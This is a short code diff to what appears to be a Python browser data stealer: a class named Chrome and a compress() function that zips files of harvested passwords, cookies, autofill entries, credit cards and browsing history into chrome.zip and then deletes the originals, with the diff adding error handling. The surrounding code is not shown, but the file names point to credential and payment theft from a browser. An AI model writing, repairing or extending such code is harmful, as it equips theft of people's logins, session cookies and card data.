@@ -167,13 +167,16 @@ class Chrome:
 
 
 def compress():
-    files = ["passwords.txt", "cookies.txt", "autofill.txt", "credit_cards.txt", "search_history.txt", "web_history.txt"]
-    with ZipFile("chrome.zip", "w") as z:
+    try:
+        files = ["passwords.txt", "cookies.txt", "autofill.txt", "credit_cards.txt", "search_history.txt", "web_history.txt"]
+        with ZipFile("chrome.zip", "w") as z:
+            for file in files:
+                z.write(file)
         for file in files:
-            z.write(file)
-    for file in files:
-        os.remove(file)
-
+            os.remove(file)
+    except Exception as e:
+        print(f"Error: {e}")
+            
 
 if __name__ == "__main__":
     chrome = Chrome()
